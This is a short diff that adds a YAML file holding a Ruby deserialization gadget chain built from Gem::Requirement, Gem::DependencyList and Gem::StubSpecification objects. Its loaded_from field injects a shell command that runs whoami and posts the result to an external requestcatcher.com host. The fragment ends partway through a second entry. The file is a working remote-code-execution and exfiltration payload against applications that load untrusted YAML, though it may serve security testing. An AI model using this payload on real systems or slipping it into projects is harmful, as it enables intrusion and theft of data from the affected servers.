@@ -1,0 +1,9 @@
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::DependencyList
+  specs:
+  - !ruby/object:Gem::Source::SpecificFile
+    spec: &1 !ruby/object:Gem::StubSpecification
+      loaded_from: "|curl -X POST -d \"$(whoami)\" https://sploitz.requestcatcher.com/hello"
+  - !ruby/object:Gem::Source::SpecificFile
+      spec:
